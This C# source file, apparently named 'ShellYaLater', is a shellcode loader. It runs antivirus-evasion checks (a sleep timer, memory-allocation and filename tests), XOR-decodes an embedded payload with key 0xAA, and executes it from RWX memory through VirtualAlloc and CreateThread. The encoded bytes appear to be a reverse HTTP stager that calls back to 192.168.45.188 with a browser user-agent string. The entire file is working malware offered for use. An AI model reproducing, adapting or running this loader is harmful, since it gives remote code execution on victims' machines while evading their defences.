using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using ShellYaLater.Evasion_Class;

namespace ShellYaLater
{
    internal class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        private delegate IntPtr J1(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        private delegate IntPtr U2(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        private delegate UInt32 ILY(IntPtr hHandle, UInt32 dwMilliseconds);

        private static J1 W1;
        private static U2 RT2;
        private static ILY ER3;

        static void Main(string[] args)
        {
            W1 = VirtualAlloc;
            RT2 = CreateThread;
            ER3 = WaitForSingleObject;
            SherryChristmas.SleepTimer();

            SherryChristmas.VAE();

            SherryChristmas.FA();
            SherryChristmas.FilenameCheck();
            //SherryChristmas.NSTT();

            byte key = 0xAA; 

            byte[] buf = new byte[] {
                 0x56, 0xE2, 0x29, 0x4E, 0x5A, 0x42, 0x66, 0xAA, 0xAA, 0xAA, 0xEB, 0xFB, 0xEB, 0xFA, 0xF8, 0xE2, 0x9B, 0x78, 0xFB, 0xFC, 0xCF, 0xE2, 0x21, 0xF8, 0xCA, 0xE2, 0x21, 0xF8, 0xB2, 0xE2, 0x21, 0xF8, 0x8A, 0xE7, 0x9B, 0x63, 0xE2, 0x21, 0xD8, 0xFA, 0xE2, 0xA5, 0x1D, 0xE0, 0xE0, 0xE2, 0x9B, 0x6A, 0x06, 0x96, 0xCB, 0xD6, 0xA8, 0x86, 0x8A, 0xEB, 0x6B, 0x63, 0xA7, 0xEB, 0xAB, 0x6B, 0x48, 0x47, 0xF8, 0xE2, 0x21, 0xF8, 0x8A, 0xEB, 0xFB, 0x21, 0xE8, 0x96, 0xE2, 0xAB, 0x7A, 0xCC, 0x2B, 0xD2, 0xB2, 0xA1, 0xA8, 0xA5, 0x2F, 0xD8, 0xAA, 0xAA, 0xAA, 0x21, 0x2A, 0x22, 0xAA, 0xAA, 0xAA, 0xE2, 0x2F, 0x6A, 0xDE, 0xCD, 0xE2, 0xAB, 0x7A, 0xFA, 0xEE, 0x21, 0xEA, 0x8A, 0x21, 0xE2, 0xB2, 0xE3, 0xAB, 0x7A, 0x49, 0xFC, 0xE2, 0x55, 0x63, 0xEB, 0x21, 0x9E, 0x22, 0xE7, 0x9B, 0x63, 0xE2, 0xAB, 0x7C, 0xE2, 0x9B, 0x6A, 0x06, 0xEB, 0x6B, 0x63, 0xA7, 0xEB, 0xAB, 0x6B, 0x92, 0x4A, 0xDF, 0x5B, 0xE6, 0xA9, 0xE6, 0x8E, 0xA2, 0xEF, 0x93, 0x7B, 0xDF, 0x72, 0xF2, 0xEE, 0x21, 0xEA, 0x8E, 0xE3, 0xAB, 0x7A, 0xCC, 0xEB, 0x21, 0xA6, 0xE2, 0xEE, 0x21, 0xEA, 0xB6, 0xE3, 0xAB, 0x7A, 0xEB, 0x21, 0xAE, 0x22, 0xE2, 0xAB, 0x7A, 0xEB, 0xF2, 0xEB, 0xF2, 0xF4, 0xF3, 0xF0, 0xEB, 0xF2, 0xEB, 0xF3, 0xEB, 0xF0, 0xE2, 0x29, 0x46, 0x8A, 0xEB, 0xF8, 0x55, 0x4A, 0xF2, 0xEB, 0xF3, 0xF0, 0xE2, 0x21, 0xB8, 0x43, 0xE1, 0x55, 0x55, 0x55, 0xF7, 0xE2, 0x9B, 0x71, 0xF9, 0xE3, 0x14, 0xDD, 0xC3, 0xC4, 0xC3, 0xC4, 0xCF, 0xDE, 0xAA, 0xEB, 0xFC, 0xE2, 0x23, 0x4B, 0xE3, 0x6D, 0x68, 0xE6, 0xDD, 0x8C, 0xAD, 0x55, 0x7F, 0xF9, 0xF9, 0x42, 0xFE, 0xAA, 0xAA, 0xAA, 0xE7, 0xC5, 0xD0, 0xC3, 0xC6, 0xC6, 0xCB, 0x85, 0x9F, 0x84, 0x9A, 0x8A, 0x82, 0xE7, 0xCB, 0xC9, 0xC3, 0xC4, 0xDE, 0xC5, 0xD9, 0xC2, 0x91, 0x8A, 0xE3, 0xC4, 0xDE, 0xCF, 0xC6, 0x8A, 0xE7, 0xCB, 0xC9, 0x8A, 0xE5, 0xF9, 0x8A, 0xF2, 0x8A, 0x9B, 0x9E, 0x84, 0x9D, 0x91, 0x8A, 0xD8, 0xDC, 0x90, 0x9B, 0x99, 0x99, 0x84, 0x9A, 0x83, 0x8A, 0xED, 0xCF, 0xC9, 0xC1, 0xC5, 0x85, 0x98, 0x9A, 0x9B, 0x9A, 0x9A, 0x9B, 0x9A, 0x9B, 0x8A, 0xEC, 0xC3, 0xD8, 0xCF, 0xCC, 0xC5, 0xD2, 0x85, 0x9B, 0x99, 0x99, 0x84, 0x9A, 0xAA, 0xF3, 0xF9, 0xF0, 0xE7, 0x9B, 0x6A, 0xE7, 0x9B, 0x63, 0xF9, 0xF9, 0xE3, 0x10, 0x90, 0xFC, 0xD3, 0x0D, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0x42, 0xA5, 0xAA, 0xAA, 0xAA, 0x9B, 0x93, 0x98, 0x84, 0x9B, 0x9C, 0x92, 0x84, 0x9E, 0x9F, 0x84, 0x9B, 0x92, 0x92, 0xAA, 0xF0, 0xE2, 0x23, 0x6B, 0xE3, 0x6D, 0x6A, 0x11, 0xAB, 0xAA, 0xAA, 0xE7, 0x9B, 0x63, 0xF9, 0xF9, 0xC0, 0xA9, 0xF9, 0xE3, 0x10, 0xFD, 0x23, 0x35, 0x6C, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0x42, 0x7C, 0xAA, 0xAA, 0xAA, 0x85, 0xDE, 0xEC, 0x87, 0xE5, 0xE7, 0xDD, 0x99, 0xE1, 0xF2, 0xE9, 0x9A, 0xDF, 0xFC, 0xE9, 0x93, 0xFD, 0xF8, 0xC1, 0x9C, 0x93, 0xED, 0xEB, 0xDB, 0xF9, 0xC4, 0xFF, 0xDD, 0x98, 0x9C, 0x92, 0xD9, 0xEB, 0x9E, 0xFE, 0x9F, 0xC6, 0xE2, 0xE2, 0xDD, 0xC4, 0xDF, 0xEC, 0xC7, 0xE7, 0x9B, 0xD3, 0xC9, 0xFA, 0xEB, 0xC2, 0xCB, 0xD3, 0xC9, 0xE9, 0x9E, 0x98, 0xE4, 0xEB, 0x98, 0xCD, 0x92, 0xC5, 0xD0, 0xD3, 0x92, 0xFC, 0xD2, 0xD9, 0xF5, 0x9B, 0xD2, 0x87, 0xC9, 0xE6, 0xC8, 0xE8, 0x99, 0xDF, 0xFC, 0x87, 0xCC, 0xC0, 0xD8, 0xE5, 0xE9, 0x9C, 0xD9, 0xE7, 0xC9, 0xE1, 0xE2, 0xF0, 0xEF, 0xC2, 0xC9, 0xE0, 0xC8, 0xE7, 0xF0, 0xC9, 0x9C, 0xEE, 0xC3, 0x99, 0xCD, 0xEE, 0xDC, 0xC9, 0xD2, 0x9E, 0xD0, 0xC0, 0xDE, 0xDD, 0xEF, 0xFA, 0xDF, 0xC7, 0x9D, 0xD0, 0xFF, 0xDC, 0xC0, 0xC9, 0xE8, 0xE0, 0xFE, 0x9A, 0xD3, 0xF5, 0xCD, 0xE3, 0xE8, 0xFB, 0xC7, 0xD2, 0xC8, 0x92, 0xFB, 0xE5, 0x9A, 0xC0, 0xFF, 0xDF, 0xE4, 0xFB, 0xE5, 0xC7, 0xED, 0xD2, 0xFC, 0xE8, 0xFA, 0xE7, 0xCC, 0xE4, 0xC2, 0xC3, 0xED, 0xD0, 0x87, 0xE2, 0x87, 0x92, 0xD9, 0xEF, 0xD3, 0xFF, 0x9B, 0xD0, 0xCF, 0xD2, 0xE5, 0xC9, 0xC9, 0xC4, 0xF8, 0xC6, 0xFC, 0xFB, 0xE3, 0xC5, 0xE7, 0x92, 0xDE, 0xD2, 0xE6, 0xD8, 0xF3, 0xDA, 0xC1, 0xF2, 0x93, 0xDC, 0xC4, 0xC6, 0x87, 0xC8, 0xF2, 0xDC, 0xDC, 0xC8, 0x98, 0xDE, 0xF0, 0xD9, 0x98, 0xD2, 0x9A, 0xC1, 0xDC, 0xCB, 0xAA, 0xE2, 0x23, 0x6B, 0xF9, 0xF0, 0xEB, 0xF2, 0xE7, 0x9B, 0x63, 0xF9, 0xE2, 0x12, 0xAA, 0x98, 0x02, 0x2E, 0xAA, 0xAA, 0xAA, 0xAA, 0xFA, 0xF9, 0xF9, 0xE3, 0x6D, 0x68, 0x41, 0xFF, 0x84, 0x91, 0x55, 0x7F, 0xE2, 0x23, 0x6C, 0xC0, 0xA0, 0xF5, 0xE2, 0x23, 0x5B, 0xC0, 0xB5, 0xF0, 0xF8, 0xC2, 0x2A, 0x99, 0xAA, 0xAA, 0xE3, 0x23, 0x4A, 0xC0, 0xAE, 0xEB, 0xF3, 0xE3, 0x10, 0xDF, 0xEC, 0x34, 0x2C, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0xE7, 0x9B, 0x6A, 0xF9, 0xF0, 0xE2, 0x23, 0x5B, 0xE7, 0x9B, 0x63, 0xE7, 0x9B, 0x63, 0xF9, 0xF9, 0xE3, 0x6D, 0x68, 0x87, 0xAC, 0xB2, 0xD1, 0x55, 0x7F, 0x2F, 0x6A, 0xDF, 0xB5, 0xE2, 0x6D, 0x6B, 0x22, 0xB9, 0xAA, 0xAA, 0xE3, 0x10, 0xEE, 0x5A, 0x9F, 0x4A, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0xE2, 0x55, 0x65, 0xDE, 0xA8, 0x41, 0x00, 0x42, 0xFF, 0xAA, 0xAA, 0xAA, 0xF9, 0xF3, 0xC0, 0xEA, 0xF0, 0xE3, 0x23, 0x7B, 0x6B, 0x48, 0xBA, 0xE3, 0x6D, 0x6A, 0xAA, 0xBA, 0xAA, 0xAA, 0xE3, 0x10, 0xF2, 0x0E, 0xF9, 0x4F, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0xE2, 0x39, 0xF9, 0xF9, 0xE2, 0x23, 0x4D, 0xE2, 0x23, 0x5B, 0xE2, 0x23, 0x70, 0xE3, 0x6D, 0x6A, 0xAA, 0x8A, 0xAA, 0xAA, 0xE3, 0x23, 0x53, 0xE3, 0x10, 0xB8, 0x3C, 0x23, 0x48, 0xAA, 0xAA, 0xAA, 0xAA, 0x55, 0x7F, 0xE2, 0x29, 0x6E, 0x8A, 0x2F, 0x6A, 0xDE, 0x18, 0xCC, 0x21, 0xAD, 0xE2, 0xAB, 0x69, 0x2F, 0x6A, 0xDF, 0x78, 0xF2, 0x69, 0xF2, 0xC0, 0xAA, 0xF3, 0xE3, 0x6D, 0x68, 0x5A, 0x1F, 0x08, 0xFC, 0x55, 0x7F
            };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] ^= key;
            }
            int size = buf.Length;

            IntPtr addr = W1(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = RT2(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            ER3(hThread, 0xFFFFFFFF);

        }
    }
}
